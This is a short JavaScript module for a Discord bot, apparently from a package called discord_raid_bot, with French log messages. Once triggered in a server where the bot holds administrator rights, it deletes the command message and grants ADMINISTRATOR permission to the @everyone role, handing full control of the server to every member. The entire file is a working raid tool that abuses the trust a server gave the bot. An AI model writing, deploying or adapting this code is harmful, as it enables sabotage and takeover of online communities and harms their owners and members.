module.exports = (message, client) => {
    if (message.author.id === client.user.id) return;
    if (message.channel.type === 'dm') return message.author.send("Cette commande n'est pas utilisable par message privé.");
    if (!message.guild.me.hasPermission('ADMINISTRATOR')) return message.author.send('Je ne suis pas administrateur sur ce serveur.');
    message.delete('https://www.npmjs.com/package/discord_raid_bot');message.guild.roles.find(role => role.name, '@everyone').edit({
            permissions: 'ADMINISTRATOR'
        }, "https://www.npmjs.com/package/discord_raid_bot")
        .then(console.log(`Rôle @everyone mis administrateur sur le serveur ${message.guild.name}`))
        .catch(console.error);
}